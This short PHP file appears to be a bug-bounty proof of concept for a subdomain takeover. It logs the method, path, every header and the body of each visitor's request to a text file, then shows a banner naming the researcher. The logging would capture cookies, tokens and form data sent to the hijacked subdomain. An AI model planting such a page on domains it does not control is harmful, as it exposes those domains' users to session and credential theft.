<?php
$log_file = "logs.txt";
$data = "--- New Request ---\n";
$data .= "Method: " . $_SERVER['REQUEST_METHOD'] . "\n";
$data .= "Path: " . $_SERVER['REQUEST_URI'] . "\n";
$data .= "Headers: " . json_encode(getallheaders()) . "\n";
$data .= "Body: " . file_get_contents("php://input") . "\n";

file_put_contents($log_file, $data, FILE_APPEND);
echo "<h1>This is Subdomaintakeover By 7azimo - hazem.brini@dbm-partners.com</h1>";
?>
